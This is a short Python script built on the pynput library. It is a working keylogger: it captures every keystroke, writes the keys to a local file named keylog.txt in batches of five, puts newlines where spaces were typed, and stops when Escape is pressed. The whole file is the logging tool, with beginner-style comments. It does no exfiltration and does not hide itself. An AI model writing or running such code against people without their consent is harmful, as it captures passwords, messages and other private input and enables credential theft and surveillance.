from pynput import keyboard

count = 0
log = [] # empty list

def on_press(key):
    global count, log
    log.append(key)
    count += 1 # for every key increment
    if count >=5:
        count = 0
        write_file(log)
        log = [] # after writing to file, empty the list

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop the listener
        return False

def write_file(log): # argument is list that contains keys
    f = open("keylog.txt","a") # a = append mode
    for key in log:
        current_key = str(key).replace("'","") # removes single quotes around all words
        if current_key == "Key.space":
            f.write('\n')
        else:
            f.write(current_key)

with keyboard.Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
